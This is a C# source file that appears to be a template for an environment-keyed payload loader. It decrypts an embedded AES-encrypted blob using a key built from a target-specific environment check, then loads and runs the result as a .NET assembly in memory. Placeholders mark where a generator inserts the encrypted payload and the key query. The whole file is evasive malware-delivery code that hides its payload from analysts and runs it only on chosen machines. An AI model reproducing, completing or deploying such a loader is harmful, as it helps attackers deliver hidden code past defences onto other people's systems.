using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace SpotterCSharp
{
    class SpotterCSharp
    {
        private static void Main(string[] args)
        {
            string encDllB64 = "ENCRYPTED_BLOB";
            byte[] encDllBytes = Convert.FromBase64String(encDllB64);
            var newIV = new byte[16];
            Array.Copy(encDllBytes, newIV, 16);
            string envKey = GetEnvKey();
            byte[] keyBytes = Encoding.UTF8.GetBytes(envKey);
            try
            {
                string plaintext = null;
                plaintext = Decrypt(keyBytes, newIV, encDllBytes);
                InjectAssembly(plaintext);
            }
            catch (Exception)
            {
                System.Environment.Exit(1);
            }
        }

        private static string GetEnvKey()
        {
            //This is the query we'll need to replace at generation
            string envKey = KEYCHECK;
            if (32 <= envKey.Length) envKey = envKey.Substring(0, 32);
            while (envKey.Length * 2 <= 32)
            {
                envKey += envKey;
            }
            if (envKey.Length < 32)
            {
                envKey += envKey.Substring(0, 32 - envKey.Length);
            }
            return envKey;
        }

        private static string Decrypt(byte[] keyBytes, byte[] newIV, byte[] newCipherText)
        {
            byte[] key = keyBytes;
            byte[] iv = newIV;
            byte[] ciphertext = newCipherText;
            string plaintext = null;
            try
            {
                using (RijndaelManaged rijAlg = new RijndaelManaged())
                {
                    rijAlg.Key = key;
                    rijAlg.IV = iv;
                    rijAlg.Padding = PaddingMode.PKCS7;
                    rijAlg.BlockSize = 128;
                    rijAlg.Mode = CipherMode.CBC;
                    ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(ciphertext))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                                if (!(plaintext.Substring(16).StartsWith("T")))
                                {
                                    plaintext = plaintext.Remove(0, 15);
                                }
                                else
                                {
                                    plaintext = plaintext.Remove(0, 16);
                                }
                                return plaintext;
                            }
                        }
                    }

                }
            }
            catch (CryptographicException e)
            {
                return null;
            }
        }
        private static void InjectAssembly(string assemblyB64)
        {
            var bytes = Convert.FromBase64String(assemblyB64);
            var assembly = Assembly.Load(bytes);
            MethodInfo method = assembly.EntryPoint;
            object o = assembly.CreateInstance(method.Name);
            method.Invoke(o, (new object[] { new string[] { } }));
        }
    }
}
